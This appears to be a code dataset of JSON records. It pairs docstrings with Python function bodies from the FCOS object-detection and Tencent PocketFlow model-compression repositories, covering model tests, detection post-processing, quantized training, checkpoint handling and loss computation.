{"docstring": "''' Make sure models build and run '''\n", "func_signal": "def _test_run_selected_detectors(self, cfg_files, device):\n", "code": "self.assertGreater(len(cfg_files), 0)\n\nfor cfg_file in cfg_files:\n    with self.subTest(cfg_file=cfg_file):\n        print('Testing {}...'.format(cfg_file))\n        cfg = utils.load_config_from_file(cfg_file)\n        cfg.MODEL.RPN.POST_NMS_TOP_N_TEST = 10\n        cfg.MODEL.RPN.FPN_POST_NMS_TOP_N_TEST = 10\n        model = create_model(cfg, device)\n        inputs = create_random_input(cfg, device)\n        model.eval()\n        output = model(inputs)\n        self.assertEqual(len(output), len(inputs.image_sizes))", "path": "FCOS/tests/test_detectors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nSelect only predictions which have a `score` > self.confidence_threshold,\nand returns the predictions in descending order of score\n\nArguments:\n    predictions (BoxList): the result of the computation by the model.\n        It should contain the field `scores`.\n\nReturns:\n    prediction (BoxList): the detected objects. Additional information\n        of the detection properties can be found in the fields of\n        the BoxList via `prediction.fields()`\n\"\"\"\n", "func_signal": "def select_top_predictions(self, predictions, confidence):\n", "code": "scores = predictions.get_field(\"scores\")\nlabels = predictions.get_field(\"labels\")\nif isinstance(confidence, float):\n    thresholds = confidence\nelse:\n    confidence = scores.new_tensor(confidence)\n    thresholds = confidence[(labels - 1).long()]\nkeep = torch.nonzero(scores > thresholds).squeeze(1)\npredictions = predictions[keep]\nscores = predictions.get_field(\"scores\")\n_, idx = scores.sort(0, descending=True)\nreturn predictions[idx]", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure roi keypoint predictors run '''\n", "func_signal": "def test_roi_keypoints_predictors(self):\n", "code": "for cur_in, cur_out, cur_cfg in _test_predictors(\n    self,\n    registry.ROI_KEYPOINT_PREDICTOR,\n    PREDICTOR_CFGS,\n    PREDICTOR_INPUT_CHANNELS,\n    hwsize=14,\n):\n    self.assertEqual(cur_out.shape[0], cur_in.shape[0])\n    self.assertEqual(\n        cur_out.shape[1], cur_cfg.MODEL.ROI_KEYPOINT_HEAD.NUM_CLASSES)", "path": "FCOS/tests/test_predictors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure rpn heads run '''\n\n", "func_signal": "def test_build_rpn_heads(self):\n", "code": "self.assertGreater(len(registry.RPN_HEADS), 0)\n\nin_channels = 64\nnum_anchors = 10\n\nfor name, builder in registry.RPN_HEADS.items():\n    print('Testing {}...'.format(name))\n    if name in RPN_CFGS:\n        cfg = load_config(RPN_CFGS[name])\n    else:\n        # Use default config if config file is not specified\n        cfg = copy.deepcopy(g_cfg)\n\n    rpn = builder(cfg, in_channels, num_anchors)\n\n    N, C_in, H, W = 2, in_channels, 24, 32\n    input = torch.rand([N, C_in, H, W], dtype=torch.float32)\n    LAYERS = 3\n    out = rpn([input] * LAYERS)\n    self.assertEqual(len(out), 2)\n    logits, bbox_reg = out\n    for idx in range(LAYERS):\n        self.assertEqual(\n            logits[idx].shape,\n            torch.Size([\n                input.shape[0], num_anchors,\n                input.shape[2], input.shape[3],\n            ])\n        )\n        self.assertEqual(\n            bbox_reg[idx].shape,\n            torch.Size([\n                logits[idx].shape[0], num_anchors * 4,\n                logits[idx].shape[2], logits[idx].shape[3],\n            ]),\n        )", "path": "FCOS/tests/test_rpn_heads.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nArguments:\n    anchors: list[list[BoxList]]\n    objectness: list[tensor]\n    box_regression: list[tensor]\n\nReturns:\n    boxlists (list[BoxList]): the post-processed anchors, after\n        applying box decoding and NMS\n\"\"\"\n", "func_signal": "def forward(self, anchors, objectness, box_regression, targets=None):\n", "code": "sampled_boxes = []\nnum_levels = len(objectness)\nanchors = list(zip(*anchors))\nfor a, o, b in zip(anchors, objectness, box_regression):\n    sampled_boxes.append(self.forward_for_single_feature_map(a, o, b))\n\nboxlists = list(zip(*sampled_boxes))\nboxlists = [cat_boxlist(boxlist) for boxlist in boxlists]\n\nif num_levels > 1:\n    boxlists = self.select_over_all_levels(boxlists)\n\n# append ground-truth bboxes to proposals\nif self.training and targets is not None:\n    boxlists = self.add_gt_proposals(boxlists, targets)\n\nreturn boxlists", "path": "FCOS/fcos_core/modeling/rpn/inference.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nReduce the loss dictionary from all processes so that process with rank\n0 has the averaged results. Returns a dict with the same fields as\nloss_dict, after reduction.\n\"\"\"\n", "func_signal": "def reduce_loss_dict(loss_dict):\n", "code": "world_size = get_world_size()\nif world_size < 2:\n    return loss_dict\nwith torch.no_grad():\n    loss_names = []\n    all_losses = []\n    for k in sorted(loss_dict.keys()):\n        loss_names.append(k)\n        all_losses.append(loss_dict[k])\n    all_losses = torch.stack(all_losses, dim=0)\n    dist.reduce(all_losses, dst=0)\n    if dist.get_rank() == 0:\n        # only main process gets accumulated, so only divide by\n        # world_size in this case\n        all_losses /= world_size\n    reduced_losses = {k: v for k, v in zip(loss_names, all_losses)}\nreturn reduced_losses", "path": "FCOS/fcos_core/engine/trainer.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure models build and run '''\n# run on selected models\n", "func_signal": "def test_run_selected_detectors(self):\n", "code": "cfg_files = get_config_files(CONFIG_FILES, None)\n# cfg_files = get_config_files(None, EXCLUDED_FOLDERS)\n_test_run_selected_detectors(self, cfg_files, \"cpu\")", "path": "FCOS/tests/test_detectors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure models build '''\n\n", "func_signal": "def _test_build_detectors(self, device):\n", "code": "cfg_files = get_config_files(None, EXCLUDED_FOLDERS)\nself.assertGreater(len(cfg_files), 0)\n\nfor cfg_file in cfg_files:\n    with self.subTest(cfg_file=cfg_file):\n        print('Testing {}...'.format(cfg_file))\n        cfg = utils.load_config_from_file(cfg_file)\n        create_model(cfg, device)", "path": "FCOS/tests/test_detectors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nAdds the predicted boxes on top of the image\n\nArguments:\n    image (np.ndarray): an image as returned by OpenCV\n    predictions (BoxList): the result of the computation by the model.\n        It should contain the field `labels`.\n\"\"\"\n", "func_signal": "def overlay_boxes(self, image, predictions):\n", "code": "labels = predictions.get_field(\"labels\")\nboxes = predictions.bbox\n\ncolors = self.compute_colors_for_labels(labels).tolist()\n\nfor box, color in zip(boxes, colors):\n    box = box.to(torch.int64)\n    top_left, bottom_right = box[:2].tolist(), box[2:].tolist()\n    cv2.rectangle(\n        image, tuple(top_left), tuple(bottom_right), tuple(color), 2\n    )\n\nreturn image", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure models build and run on cuda '''\n# run on selected models\n", "func_signal": "def test_run_selected_detectors_cuda(self):\n", "code": "cfg_files = get_config_files(CONFIG_FILES, None)\n# cfg_files = get_config_files(None, EXCLUDED_FOLDERS)\n_test_run_selected_detectors(self, cfg_files, \"cuda\")", "path": "FCOS/tests/test_detectors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nArguments:\n    anchors: list[BoxList]\n    objectness: tensor of size N, A, H, W\n    box_regression: tensor of size N, A * 4, H, W\n\"\"\"\n", "func_signal": "def forward_for_single_feature_map(self, anchors, objectness, box_regression):\n", "code": "device = objectness.device\nN, A, H, W = objectness.shape\n\n# put in the same format as anchors\nobjectness = permute_and_flatten(objectness, N, A, 1, H, W).view(N, -1)\nobjectness = objectness.sigmoid()\n\nbox_regression = permute_and_flatten(box_regression, N, A, 4, H, W)\n\nnum_anchors = A * H * W\n\npre_nms_top_n = min(self.pre_nms_top_n, num_anchors)\nobjectness, topk_idx = objectness.topk(pre_nms_top_n, dim=1, sorted=True)\n\nbatch_idx = torch.arange(N, device=device)[:, None]\nbox_regression = box_regression[batch_idx, topk_idx]\n\nimage_shapes = [box.size for box in anchors]\nconcat_anchors = torch.cat([a.bbox for a in anchors], dim=0)\nconcat_anchors = concat_anchors.reshape(N, -1, 4)[batch_idx, topk_idx]\n\nproposals = self.box_coder.decode(\n    box_regression.view(-1, 4), concat_anchors.view(-1, 4)\n)\n\nproposals = proposals.view(N, -1, 4)\n\nresult = []\nfor proposal, score, im_shape in zip(proposals, objectness, image_shapes):\n    boxlist = BoxList(proposal, im_shape, mode=\"xyxy\")\n    boxlist.add_field(\"objectness\", score)\n    boxlist = boxlist.clip_to_image(remove_empty=False)\n    boxlist = remove_small_boxes(boxlist, self.min_size)\n    boxlist = boxlist_nms(\n        boxlist,\n        self.nms_thresh,\n        max_proposals=self.post_nms_top_n,\n        score_field=\"objectness\",\n    )\n    result.append(boxlist)\nreturn result", "path": "FCOS/fcos_core/modeling/rpn/inference.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure roi mask predictors run '''\n", "func_signal": "def test_roi_mask_predictors(self):\n", "code": "for cur_in, cur_out, cur_cfg in _test_predictors(\n    self,\n    registry.ROI_MASK_PREDICTOR,\n    PREDICTOR_CFGS,\n    PREDICTOR_INPUT_CHANNELS,\n    hwsize=14,\n):\n    self.assertEqual(cur_out.shape[0], cur_in.shape[0])\n    self.assertEqual(\n        cur_out.shape[1], cur_cfg.MODEL.ROI_BOX_HEAD.NUM_CLASSES)", "path": "FCOS/tests/test_predictors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "'''\n:param im (np.ndarray): an image as returned by OpenCV\n:return:\n'''\n", "func_signal": "def detect(self, im, min_confidence=None):\n", "code": "image = self.transforms(im)\n# convert to an ImageList, padded so that it is divisible by\n# cfg.DATALOADER.SIZE_DIVISIBILITY\nimage_list = to_image_list(image, self.cfg.DATALOADER.SIZE_DIVISIBILITY)\nimage_list = image_list.to(self.device)\n# compute predictions\nwith torch.no_grad():\n    predictions = self.model(image_list)\npredictions = [o.to(self.cpu_device) for o in predictions]\n\nassert len(predictions) == 1\npredictions = predictions[0]\n\nif min_confidence is None:\n    min_confidence = _MODEL_NAMES_TO_INFO_[self.model_name][\"best_min_confidence\"]\n\npredictions = self.select_top_predictions(predictions, min_confidence)\nreturn self._bbox_list_to_py_bbox_list(predictions)", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nArguments:\n    proposals: list[BoxList]\n    targets: list[BoxList]\n\"\"\"\n# Get the device we're operating on\n", "func_signal": "def add_gt_proposals(self, proposals, targets):\n", "code": "device = proposals[0].bbox.device\n\ngt_boxes = [target.copy_with_fields([]) for target in targets]\n\n# later cat of bbox requires all fields to be present for all bbox\n# so we need to add a dummy for objectness that's missing\nfor gt_box in gt_boxes:\n    gt_box.add_field(\"objectness\", torch.ones(len(gt_box), device=device))\n\nproposals = [\n    cat_boxlist((proposal, gt_box))\n    for proposal, gt_box in zip(proposals, gt_boxes)\n]\n\nreturn proposals", "path": "FCOS/fcos_core/modeling/rpn/inference.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\" Get all stages except the last one \"\"\"\n", "func_signal": "def _get_trunk_cfg(arch_def):\n", "code": "num_stages = mbuilder.get_num_stages(arch_def)\ntrunk_stages = arch_def.get(\"backbone\", range(num_stages - 1))\nret = mbuilder.get_blocks(arch_def, stage_indices=trunk_stages)\nreturn ret", "path": "FCOS/fcos_core/modeling/backbone/fbnet.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "''' Make sure roi box predictors run '''\n", "func_signal": "def test_roi_box_predictors(self):\n", "code": "for cur_in, cur_out, cur_cfg in _test_predictors(\n    self,\n    registry.ROI_BOX_PREDICTOR,\n    PREDICTOR_CFGS,\n    PREDICTOR_INPUT_CHANNELS,\n    hwsize=1,\n):\n    self.assertEqual(len(cur_out), 2)\n    scores, bbox_deltas = cur_out[0], cur_out[1]\n    self.assertEqual(\n        scores.shape[1], cur_cfg.MODEL.ROI_BOX_HEAD.NUM_CLASSES)\n    self.assertEqual(scores.shape[0], cur_in.shape[0])\n    self.assertEqual(scores.shape[0], bbox_deltas.shape[0])\n    self.assertEqual(scores.shape[1] * 4, bbox_deltas.shape[1])", "path": "FCOS/tests/test_predictors.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"\nCreates a basic transformation that was used to train the models\n\"\"\"\n", "func_signal": "def build_transform(self):\n", "code": "cfg = self.cfg\n\n# we are loading images with OpenCV, so we don't need to convert them\n# to BGR, they are already! So all we need to do is to normalize\n# by 255 if we want to convert to BGR255 format, or flip the channels\n# if we want it to be in RGB in [0-1] range.\nif cfg.INPUT.TO_BGR255:\n    to_bgr_transform = T.Lambda(lambda x: x * 255)\nelse:\n    to_bgr_transform = T.Lambda(lambda x: x[[2, 1, 0]])\n\nnormalize_transform = T.Normalize(\n    mean=cfg.INPUT.PIXEL_MEAN, std=cfg.INPUT.PIXEL_STD\n)\n\ntransform = T.Compose(\n    [\n        T.ToPILImage(),\n        T.ToTensor(),\n        to_bgr_transform,\n        normalize_transform,\n    ]\n)\nreturn transform", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "'''\n:param py_bbox_list:\n:param im_size: (w, h)\n:return:\n'''\n", "func_signal": "def _py_bbox_list_to_bbox_list(self, py_bbox_list, im_size):\n", "code": "bboxes = []\nlabels = []\nscores = []\nfor item in py_bbox_list:\n    bboxes.append(item[\"box\"])\n    labels.append(item[\"label_id\"])\n    scores.append(item[\"score\"])\n\nbox_list = BoxList(torch.tensor(bboxes, dtype=torch.float32), im_size)\nbox_list.add_field(\"labels\", torch.tensor(labels, dtype=torch.long))\nbox_list.add_field(\"scores\", torch.tensor(scores, dtype=torch.float32))\n\nreturn box_list", "path": "FCOS/fcos/fcos.py", "commit_date": "2019-08-06 00:00:00", "repo_name": "tianzhi0549/FCOS", "stars": 3225, "license": "other", "language": "python", "size": 8901}
{"docstring": "\"\"\"Restore a model from the latest checkpoint files and then evaluate it.\"\"\"\n\n", "func_signal": "def evaluate(self):\n", "code": "self.__restore_model(is_train=False)\nnb_iters = int(np.ceil(float(FLAGS.nb_smpls_eval) / FLAGS.batch_size_eval))\neval_rslts = np.zeros((nb_iters, len(self.eval_op)))\nself.dump_n_eval(outputs=None, action='init')\nfor idx_iter in range(nb_iters):\n  if (idx_iter + 1) % 100 == 0:\n    tf.logging.info('process the %d-th mini-batch for evaluation' % (idx_iter + 1))\n  eval_rslts[idx_iter], outputs = self.sess_eval.run([self.eval_op, self.outputs_eval])\n  self.dump_n_eval(outputs=outputs, action='dump')\nself.dump_n_eval(outputs=None, action='eval')\nfor idx, name in enumerate(self.eval_op_names):\n  tf.logging.info('%s = %.4e' % (name, np.mean(eval_rslts[:, idx])))", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Monitor the training progress.\n\nArgs:\n* summary: summary protocol buffer\n* log_rslt: logging operations' results\n* idx_iter: index of the training iteration\n* time_step: time step between two summary operations\n\"\"\"\n\n# write summaries for TensorBoard visualization\n", "func_signal": "def __monitor_progress(self, summary, log_rslt, idx_iter, time_step):\n", "code": "self.sm_writer.add_summary(summary, idx_iter)\n\n# compute the training speed\nspeed = FLAGS.batch_size * FLAGS.summ_step / time_step\nif FLAGS.enbl_multi_gpu:\n  speed *= mgw.size()\n\n# display monitored statistics\nlog_str = ' | '.join(['%s = %.4e' % (name, value)\n                      for name, value in zip(self.log_op_names, log_rslt)])\ntf.logging.info('iter #%d: %s | speed = %.2f pics / sec' % (idx_iter + 1, log_str, speed))", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Restore a model from the latest checkpoint files.\n\nArgs:\n* is_train: whether to restore a model for training\n\"\"\"\n\n", "func_signal": "def __restore_model(self, is_train):\n", "code": "save_path = tf.train.latest_checkpoint(os.path.dirname(FLAGS.uqtf_save_path))\nif is_train:\n  self.saver_quan_train.restore(self.sess_train, save_path)\nelse:\n  self.saver_quan_eval.restore(self.sess_eval, save_path)\ntf.logging.info('model restored from ' + save_path)", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Calculate loss (and some extra evaluation metrics).\"\"\"\n\n", "func_signal": "def calc_loss(self, labels, outputs, trainable_vars):\n", "code": "loss = tf.losses.softmax_cross_entropy(labels, outputs)\nloss_filter = lambda var: 'batch_normalization' not in var.name\nloss += FLAGS.loss_w_dcy \\\n    * tf.add_n([tf.nn.l2_loss(var) for var in trainable_vars if loss_filter(var)])\ntargets = tf.argmax(labels, axis=1)\nacc_top1 = tf.reduce_mean(tf.cast(tf.nn.in_top_k(outputs, targets, 1), tf.float32))\nacc_top5 = tf.reduce_mean(tf.cast(tf.nn.in_top_k(outputs, targets, 5), tf.float32))\nmetrics = {'accuracy': acc_top5, 'acc_top1': acc_top1, 'acc_top5': acc_top5}\n\nreturn loss, metrics", "path": "PocketFlow/nets/mobilenet_at_ilsvrc12.py", "commit_date": "2019-03-03 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Train a model and periodically produce checkpoint files.\"\"\"\n\n# restore the full model from pre-trained checkpoints\n", "func_signal": "def train(self):\n", "code": "save_path = tf.train.latest_checkpoint(os.path.dirname(self.save_path_full))\nself.saver_full.restore(self.sess_train, save_path)\n\n# initialization\nself.sess_train.run([self.init_op, self.init_opt_op])\nif FLAGS.enbl_multi_gpu:\n  self.sess_train.run(self.bcast_op)\n\n# train the model through iterations and periodically save & evaluate the model\ntime_prev = timer()\nfor idx_iter in range(self.nb_iters_train):\n  # train the model\n  if (idx_iter + 1) % FLAGS.summ_step != 0:\n    self.sess_train.run(self.train_op)\n  else:\n    __, summary, log_rslt = self.sess_train.run([self.train_op, self.summary_op, self.log_op])\n    if self.is_primary_worker('global'):\n      time_step = timer() - time_prev\n      self.__monitor_progress(summary, log_rslt, idx_iter, time_step)\n      time_prev = timer()\n\n  # save the model at certain steps\n  if self.is_primary_worker('global') and (idx_iter + 1) % FLAGS.save_step == 0:\n    self.__save_model(is_train=True)\n    self.evaluate()\n  self.auto_barrier()\n\n# save the final model\nif self.is_primary_worker('global'):\n  self.__save_model(is_train=True)\n  self.__restore_model(is_train=False)\n  self.__save_model(is_train=False)\n  self.evaluate()", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Get list of variables within certain name scope.\n\nArgs:\n* scope: name scope\n\nReturns:\n* vars_dict: dictionary of list of all and trainable variables\n\"\"\"\n\n", "func_signal": "def get_vars_by_scope(scope):\n", "code": "vars_dict = {}\nvars_dict['all'] = tf.get_collection(tf.GraphKeys.GLOBAL_VARIABLES, scope=scope)\nvars_dict['trainable'] = tf.get_collection(tf.GraphKeys.TRAINABLE_VARIABLES, scope=scope)\n\nreturn vars_dict", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Build the evaluation graph.\"\"\"\n\n", "func_signal": "def __build_eval(self):\n", "code": "with tf.Graph().as_default() as graph:\n  # create a TF session for the current graph\n  config = tf.ConfigProto()\n  config.gpu_options.visible_device_list = str(mgw.local_rank() if FLAGS.enbl_multi_gpu else 0)  # pylint: disable=no-member\n  config.gpu_options.allow_growth = True  # pylint: disable=no-member\n  self.sess_eval = tf.Session(config=config)\n\n  # data input pipeline\n  with tf.variable_scope(self.data_scope):\n    iterator = self.build_dataset_eval()\n    images, labels = iterator.get_next()\n\n  # model definition - uniform quantized model - part 1\n  with tf.variable_scope(self.model_scope_quan):\n    logits = self.forward_eval(images)\n    if not isinstance(logits, dict):\n      outputs = tf.nn.softmax(logits)\n    else:\n      outputs = tf.nn.softmax(logits['cls_pred'])\n    tf.contrib.quantize.experimental_create_eval_graph(\n      weight_bits=FLAGS.uqtf_weight_bits,\n      activation_bits=FLAGS.uqtf_activation_bits,\n      scope=self.model_scope_quan)\n    for node_name in self.unquant_node_names:\n      insert_quant_op(graph, node_name, is_train=False)\n    vars_quan = get_vars_by_scope(self.model_scope_quan)\n    global_step = tf.train.get_or_create_global_step()\n    self.saver_quan_eval = tf.train.Saver(vars_quan['all'] + [global_step])\n\n  # model definition - distilled model\n  if FLAGS.enbl_dst:\n    logits_dst = self.helper_dst.calc_logits(self.sess_eval, images)\n\n  # model definition - uniform quantized model -part 2\n  with tf.variable_scope(self.model_scope_quan):\n    # loss & extra evaluation metrics\n    loss, metrics = self.calc_loss(labels, logits, vars_quan['trainable'])\n    if FLAGS.enbl_dst:\n      loss += self.helper_dst.calc_loss(logits, logits_dst)\n\n    # TF operations for evaluation\n    self.eval_op = [loss] + list(metrics.values())\n    self.eval_op_names = ['loss'] + list(metrics.keys())\n    self.outputs_eval = logits\n\n  # add input & output tensors to certain collections\n  if not isinstance(images, dict):\n    tf.add_to_collection('images_final', images)\n  else:\n    tf.add_to_collection('images_final', images['image'])\n  if not isinstance(logits, dict):\n    tf.add_to_collection('logits_final', logits)\n  else:\n    tf.add_to_collection('logits_final', logits['cls_pred'])", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Setup the learning rate (and number of training iterations).\"\"\"\n\n", "func_signal": "def setup_lrn_rate(self, global_step):\n", "code": "batch_size = FLAGS.batch_size * (1 if not FLAGS.enbl_multi_gpu else mgw.size())\nif FLAGS.mobilenet_version == 1:\n  nb_epochs = 100\n  idxs_epoch = [30, 60, 80, 90]\n  decay_rates = [1.0, 0.1, 0.01, 0.001, 0.0001]\n  lrn_rate = setup_lrn_rate_piecewise_constant(global_step, batch_size, idxs_epoch, decay_rates)\n  nb_iters = int(FLAGS.nb_smpls_train * nb_epochs * FLAGS.nb_epochs_rat / batch_size)\nelif FLAGS.mobilenet_version == 2:\n  nb_epochs = 412\n  epoch_step = 2.5\n  decay_rate = 0.98 ** epoch_step  # which is better, 0.98 OR (0.98 ** epoch_step)?\n  lrn_rate = setup_lrn_rate_exponential_decay(global_step, batch_size, epoch_step, decay_rate)\n  nb_iters = int(FLAGS.nb_smpls_train * nb_epochs * FLAGS.nb_epochs_rat / batch_size)\nelse:\n  raise ValueError('invalid MobileNet version: {}'.format(FLAGS.mobilenet_version))\n\nreturn lrn_rate, nb_iters", "path": "PocketFlow/nets/mobilenet_at_ilsvrc12.py", "commit_date": "2019-03-03 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Save the current model for training or evaluation.\n\nArgs:\n* is_train: whether to save a model for training\n\"\"\"\n\n", "func_signal": "def __save_model(self, is_train):\n", "code": "if is_train:\n  save_path = self.saver_quan_train.save(\n    self.sess_train, FLAGS.uqtf_save_path, self.global_step)\nelse:\n  save_path = self.saver_quan_eval.save(self.sess_eval, FLAGS.uqtf_save_path_eval)\ntf.logging.info('model saved to ' + save_path)", "path": "PocketFlow/learners/uniform_quantization_tf/learner.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Monitor the training progress.\n\nArgs:\n* summary: summary protocol buffer\n* log_rslt: logging operations' results\n* idx_iter: index of the training iteration\n* time_step: time step between two summary operations\n\"\"\"\n\n# write summaries for TensorBoard visualization\n", "func_signal": "def __monitor_progress(self, summary, log_rslt, idx_iter, time_step):\n", "code": "self.sm_writer.add_summary(summary, idx_iter)\n\n# compute the training speed\nspeed = FLAGS.batch_size * FLAGS.summ_step / time_step\nif FLAGS.enbl_multi_gpu:\n  speed *= mgw.size()\n\n# display monitored statistics\nlog_str = ' | '.join(['%s = %.4e' % (name, value)\n                      for name, value in zip(self.log_op_names, log_rslt)])\ntf.logging.info('iter #%d: %s | speed = %.2f pics / sec' % (idx_iter + 1, log_str, speed))", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Constructor function.\n\nArgs:\n* sm_writer: TensorFlow's summary writer\n* model_helper: model helper with definitions of model & dataset\n* model_scope: name scope in which to define the model\n* enbl_dst: whether to create a model with distillation loss\n\"\"\"\n\n# class-independent initialization\n", "func_signal": "def __init__(self, sm_writer, model_helper, model_scope=None, enbl_dst=None):\n", "code": "super(FullPrecLearner, self).__init__(sm_writer, model_helper)\n\n# over-ride the model scope and distillation loss switch\nif model_scope is not None:\n  self.model_scope = model_scope\nself.enbl_dst = enbl_dst if enbl_dst is not None else FLAGS.enbl_dst\n\n# class-dependent initialization\nif self.enbl_dst:\n  self.helper_dst = DistillationHelper(sm_writer, model_helper, self.mpi_comm)\nself.__build(is_train=True)\nself.__build(is_train=False)", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Restore a model from the latest checkpoint files and then evaluate it.\"\"\"\n\n", "func_signal": "def evaluate(self):\n", "code": "self.__restore_model(is_train=False)\nnb_iters = int(np.ceil(float(FLAGS.nb_smpls_eval) / FLAGS.batch_size_eval))\neval_rslts = np.zeros((nb_iters, len(self.eval_op)))\nself.dump_n_eval(outputs=None, action='init')\nfor idx_iter in range(nb_iters):\n  eval_rslts[idx_iter], outputs = self.sess_eval.run([self.eval_op, self.outputs_eval])\n  self.dump_n_eval(outputs=outputs, action='dump')\nself.dump_n_eval(outputs=None, action='eval')\nfor idx, name in enumerate(self.eval_op_names):\n  tf.logging.info('%s = %.4e' % (name, np.mean(eval_rslts[:, idx])))", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Check whether is the primary worker of all nodes (global) or the current node (local).\n\nArgs:\n* scope: check scope ('global' OR 'local')\n\nReturns:\n* flag: whether is the primary worker\n\"\"\"\n\n", "func_signal": "def is_primary_worker(scope='global'):\n", "code": "if scope == 'global':\n  return True if not FLAGS.enbl_multi_gpu else mgw.rank() == 0\nelif scope == 'local':\n  return True if not FLAGS.enbl_multi_gpu else mgw.local_rank() == 0\nelse:\n  raise ValueError('unrecognized worker scope: ' + scope)", "path": "PocketFlow/utils/misc_utils.py", "commit_date": "2019-01-15 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
{"docstring": "\"\"\"Save the model to checkpoint files for training or evaluation.\n\nArgs:\n* is_train: whether to save a model for training\n\"\"\"\n\n", "func_signal": "def __save_model(self, is_train):\n", "code": "if is_train:\n  save_path = self.saver_train.save(self.sess_train, FLAGS.save_path, self.global_step)\nelse:\n  save_path = self.saver_eval.save(self.sess_eval, FLAGS.save_path_eval)\ntf.logging.info('model saved to ' + save_path)", "path": "PocketFlow/learners/full_precision/learner.py", "commit_date": "2019-03-05 00:00:00", "repo_name": "Tencent/PocketFlow", "stars": 2771, "license": "other", "language": "python", "size": 1190}
